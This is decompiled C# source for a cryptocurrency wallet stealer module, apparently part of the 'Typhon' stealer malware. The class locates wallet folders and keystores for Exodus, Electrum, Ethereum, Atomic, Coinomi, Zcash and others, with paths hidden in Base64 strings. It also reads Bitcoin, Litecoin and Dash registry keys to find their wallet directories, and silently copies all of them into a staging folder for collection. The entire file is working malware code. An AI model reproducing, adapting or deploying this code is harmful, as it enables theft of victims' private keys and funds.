using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using Microsoft.Win32;
using Typhon.Modules.Miscellaneous;

namespace Typhon.Stealer.Software.CryptoApps
{
	// Token: 0x02000025 RID: 37
	internal class CryptoWalletStealer
	{
		// Token: 0x06000099 RID: 153 RVA: 0x00006904 File Offset: 0x00004B04
		public static void CopyWallet_dat(string sSaveDir)
		{
			try
			{
				bool flag = false;
				using (List<string[]>.Enumerator enumerator = CryptoWalletStealer.walletDir.GetEnumerator())
				{
					while (enumerator.MoveNext())
					{
						if (Directory.Exists(enumerator.Current[1]))
						{
							flag = true;
						}
					}
				}
				if (flag)
				{
					Directory.CreateDirectory(sSaveDir);
					foreach (string[] array in CryptoWalletStealer.walletDir)
					{
						CryptoWalletStealer.CopyWallets(sSaveDir, array[1], array[0]);
					}
					foreach (string sWalletRegistry in CryptoWalletStealer.sWalletsRegistry)
					{
						CryptoWalletStealer.CopyWallets_reg(sSaveDir, sWalletRegistry);
					}
					if (Directory.GetFiles(sSaveDir).Length == 0 && Directory.GetDirectories(sSaveDir).Length == 0)
					{
						IOHelper.DeleteDirectory(sSaveDir, false);
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x0600009A RID: 154 RVA: 0x00006A00 File Offset: 0x00004C00
		private static void CopyWallets(string sSaveDir, string sWalletDir, string sWalletName)
		{
			string copyDirPath = Path.Combine(sSaveDir, sWalletName);
			if (Directory.Exists(sWalletDir))
			{
				IOHelper.CopyDirectory(sWalletDir, copyDirPath);
			}
		}

		// Token: 0x0600009B RID: 155 RVA: 0x00006A28 File Offset: 0x00004C28
		private static void CopyWallets_reg(string sSaveDir, string sWalletRegistry)
		{
			string copyDirPath = Path.Combine(sSaveDir, sWalletRegistry);
			try
			{
				using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software").OpenSubKey(sWalletRegistry).OpenSubKey(sWalletRegistry + "-Qt"))
				{
					if (registryKey != null)
					{
						string text = registryKey.GetValue("strDataDir").ToString() + "\\wallets";
						if (Directory.Exists(text))
						{
							IOHelper.CopyDirectory(text, copyDirPath);
						}
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x04000044 RID: 68
		public static List<string[]> walletDir = new List<string[]>
		{
			new string[]
			{
				"Zcash",
				Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Encoding.UTF8.GetString(Convert.FromBase64String("XFpjYXNo"))
			},
			new string[]
			{
				"Armory",
				Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Encoding.UTF8.GetString(Convert.FromBase64String("XEFybW9yeQ=="))
			},
			new string[]
			{
				"Bytecoin",
				Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Encoding.UTF8.GetString(Convert.FromBase64String("XGJ5dGVjb2lu"))
			},
			new string[]
			{
				"Jaxx",
				Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Encoding.UTF8.GetString(Convert.FromBase64String("XGNvbS5saWJlcnR5LmpheHhcSW5kZXhlZERCXGZpbGVfXzAuaW5kZXhlZGRiLmxldmVsZGI="))
			},
			new string[]
			{
				"Exodus",
				Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Encoding.UTF8.GetString(Convert.FromBase64String("XEV4b2R1c1xleG9kdXMud2FsbGV0"))
			},
			new string[]
			{
				"Ethereum",
				Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Encoding.UTF8.GetString(Convert.FromBase64String("XEV0aGVyZXVtXGtleXN0b3Jl"))
			},
			new string[]
			{
				"Electrum",
				Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Encoding.UTF8.GetString(Convert.FromBase64String("XEVsZWN0cnVtXHdhbGxldHM="))
			},
			new string[]
			{
				"AtomicWallet",
				Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Encoding.UTF8.GetString(Convert.FromBase64String("XGF0b21pY1xMb2NhbCBTdG9yYWdlXGxldmVsZGI="))
			},
			new string[]
			{
				"Guarda",
				Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Encoding.UTF8.GetString(Convert.FromBase64String("XEd1YXJkYVxMb2NhbCBTdG9yYWdlXGxldmVsZGI="))
			},
			new string[]
			{
				"Coinomi",
				Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + Encoding.UTF8.GetString(Convert.FromBase64String("XENvaW5vbWlcQ29pbm9taVx3YWxsZXRz"))
			}
		};

		// Token: 0x04000045 RID: 69
		private static string[] sWalletsRegistry = new string[]
		{
			"Litecoin",
			"Dash",
			"Bitcoin"
		};
	}
}
